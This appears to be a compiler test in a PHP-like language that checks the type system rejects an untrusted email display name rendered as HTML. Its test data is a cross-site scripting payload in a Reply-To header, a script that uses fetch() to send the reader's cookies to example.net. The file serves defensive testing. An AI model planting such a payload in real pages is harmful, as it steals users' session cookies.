<?nvs
// Attack: a visitor writes a `<script>` tag as their name in `Reply-To`, and a page shows the name as HTML.
// The name is tainted: it comes from outside the program, and the program must check or escape it.
// A tainted string is not `Core\Html\Markup`, so the page cannot show it as HTML. So this program should not compile.
// hostile: expect-refusal

use Core\Html\Markup;
use Core\Mail\Message;

// 1. The name is a script that sends the reader's cookies to another site.
Message $mail = Message::parse(
    "Reply-To: \"<script>fetch('https://example.net/?c=' + document.cookie)</script>\" <x@example.net>\r\n\r\nHi",
);
Markup $page = $mail->replyTo()[0]->name();
echo $page, "\n";
